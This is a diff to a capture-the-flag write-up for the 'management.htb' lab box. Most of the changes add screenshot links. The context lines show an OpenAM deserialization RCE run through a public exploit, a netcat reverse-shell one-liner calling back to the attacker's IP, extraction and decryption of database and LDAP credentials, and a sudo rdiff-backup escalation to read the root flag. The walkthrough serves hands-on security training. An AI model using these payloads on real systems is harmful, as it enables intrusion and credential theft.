@@ -23,7 +23,7 @@ Next, I ran an initial Nmap scan to discover open ports and running services:
 nmap -p- -sC -sV --min-rate 10000 -T5 10.129.103.207
 ```
 
-![Nmap scan results](/ctf-writeups/assets/img/mgmt-nmap-1.png)
+![Nmap scan results](/ctf-writeups/assets/img/management-1.jpg)
 
 The scan revealed several open ports:
 * **Port 22**: SSH (`OpenSSH 9.6p1`)
@@ -33,6 +33,8 @@ The scan revealed several open ports:
 * **Port 4444**: SSL / krb524 (Administration Connector)
 * **Port 50389**: LDAP (Anonymous bind OK)
 
+![Management.htb homepage](/ctf-writeups/assets/img/management-2.png)
+
 ---
 
 ## 2. Enumeration & OpenAM RCE (CVE-2026-33439)
@@ -41,9 +43,17 @@ Directory fuzzing on `https://management.htb/` didn't turn up hidden directories
 
 Inspecting the source code of the login page revealed the running software version: **OpenAM 16.0.5**.
 
+![OpenAM login page source revealing v=16.0.5](/ctf-writeups/assets/img/management-3.png)
+
 A search for this version pointed to **CVE-2026-33439**, a pre-authentication Remote Code Execution vulnerability caused by unsafe Java deserialization via the `jato.clientSession` parameter.
 
-I found a public Python proof-of-concept exploit for this CVE. To exploit it, I started a Netcat listener on my local machine:
+![CVE-2026-33439 vulnerability details](/ctf-writeups/assets/img/management-4.png)
+
+I found a public Python proof-of-concept exploit for this CVE.
+
+![CVE-2026-33439 Python PoC repository](/ctf-writeups/assets/img/management-5.png)
+
+To exploit it, I started a Netcat listener on my local machine:
 
 ```bash
 nc -lvnp 4444
@@ -55,7 +65,12 @@ Then, I ran the exploit script against the OpenAM password reset endpoint, passi
 python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.171 4444 >/tmp/f'
 ```
 
+![Running the exploit script](/ctf-writeups/assets/img/management-6.png)
+
 Instantly, my listener caught a connection, giving me a shell as the `openam` user.
+
+![Reverse shell as openam user](/ctf-writeups/assets/img/management-7.jpg)
+
 
 ---
 
@@ -65,6 +80,8 @@ While exploring the system from the `openam` user context, I located the GLPI co
 * **Database User**: `glpi`
 * **Database Password**: `8rhu0L6Pw4Y7`
 * **Database Name**: `glpidb`
+
+![Reading config_db.php for database credentials](/ctf-writeups/assets/img/management-8.png)
 
 ```php
 public $dbhost = '127.0.0.1';
@@ -84,6 +101,8 @@ Among the tables, `glpi_authldaps` looked promising. Querying it revealed an enc
 ```bash
 mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps;"
 ```
+![Querying glpi_authldaps for the encrypted password](/ctf-writeups/assets/img/management-9.jpg)
+
 * **Encrypted String**: `avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==`
 
 After analyzing GLPI's encryption scheme, I found that GLPI 10.x uses **libsodium XChaCha20-Poly1305** to encrypt sensitive fields. The application's built-in `GLPIKey` class can decrypt this.
@@ -93,6 +112,8 @@ I wrote a quick one-liner PHP script utilizing GLPI's internal key management to
 ```bash
 php -r ' define("GLPI_CONFIG_DIR", "/opt/glpi/config"); require_once "vendor/autoload.php"; require_once "src/GLPIKey.php"; $key = new GLPIKey(); echo $key->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=="), PHP_EOL; '
 ```
+
+![Decrypting the GLPI password](/ctf-writeups/assets/img/management-10.png)
 
 This successfully decrypted the string into the plain-text password: **`WpczC40GhTbk`**.
 
@@ -115,6 +136,8 @@ Checking sudo privileges for user `owen` via `sudo -l` revealed a very interesti
 sudo -l
 ```
 
+![sudo -l output showing rdiff-backup misconfiguration](/ctf-writeups/assets/img/management-11.png) 
+
 The output showed that `owen` could run `rdiff-backup` as root without a password under strict path and mode restrictions:
 ```text
 (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
@@ -134,5 +157,8 @@ Navigating into the backup folder, I was able to read `root.txt` directly:
 cd /tmp/root_backup/
 cat root.txt
 ```
+
+![Root shell via rdiff-backup and reading root.txt](/ctf-writeups/assets/img/management-12.jpg)
+
 
 * **Root Flag**: `33946f4ab402fa3c3ecf155a4b3985d4`
